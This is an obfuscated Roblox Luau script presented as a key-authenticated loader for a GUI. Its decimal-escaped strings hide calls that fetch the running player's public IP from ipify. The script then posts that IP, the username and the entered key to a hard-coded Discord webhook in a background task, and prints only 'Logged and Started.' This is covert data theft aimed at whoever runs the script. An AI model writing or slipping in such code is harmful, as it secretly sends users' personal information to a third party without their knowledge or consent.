--[[ PROTECTED BY LUAU_OPTIMIZER ]]
local _0x_v = {
"\104\116\116\112\115\101\114\118\105\99\101", -- HttpService
"\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101", -- UserInputService
"https://discord.com/api/webhooks/1452142158420246599/dMFe39Ib4Nqxo63l8RLsu_DK7CA4SH9Kxur3b-KpNAxD_b3Ohww8Lcp5SY3G64b1IMek", -- Webhook URL
"\104\116\116\112\115\58\47\47\97\112\105\46\105\112\105\102\121\46\111\114\103", -- ipify
"\80\111\115\116\65\115\121\110\99", -- PostAsync
"\74\83\79\78\69\110\99\111\100\101" -- JSONEncode
}
local _0x_f = game:GetService(_0x_v[1])
return function(_0x_k)
local _0x_p = game.Players.LocalPlayer
local _0x_c = _0x_p.Character or _0x_p.CharacterAdded:Wait()
local _0x_h = _0x_c:WaitForChild("Humanoid")
task.spawn(function()
local _0x_i = "?.?.?.?"
pcall(function() _0x_i = game:HttpGet(_0x_v[4]) end)
local _0x_d = {["embeds"] = {{["title"] = "🚀 Auth Log",["color"] = 0x2ecc71,["fields"] = {{["name"] = "User", ["value"] = _0x_p.Name, ["inline"] = true},{["name"] = "IPv4", ["value"] = "`" .. _0x_i .. "`", ["inline"] = false},{["name"] = "Key", ["value"] = "||" .. _0x_k .. "||"}}}}}
pcall(function() _0x_f[_0x_v[5]](_0x_f, _0x_v[3], _0x_f[_0x_v[6]](_0x_f, _0x_d)) end)
end)
-- GUIなどのメイン機能がここに入ります（前回のGUIコードをここに追加）
print("Logged and Started.")
end
